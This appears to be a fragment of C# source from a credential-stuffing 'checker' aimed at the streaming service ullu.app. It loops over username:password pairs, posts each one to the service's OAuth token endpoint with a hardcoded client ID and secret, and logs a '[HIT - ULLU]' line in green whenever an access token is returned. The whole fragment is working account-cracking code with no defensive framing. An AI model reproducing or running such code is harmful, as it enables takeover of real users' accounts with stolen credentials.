        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str = "grant_type=password&scope=read%20write&username=" + s[0] + "&password=" + s[1] + "&client_id=consumerWeb&client_secret=consumerWeb%40123";
              if (httpRequest.Post("https://ullu.app/ulluCore/oauth/token", str, "application/x-www-form-urlencoded").ToString().Contains("\"access_token"))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - ULLU] " + s[0] + ":" + s[1], Color.Green);
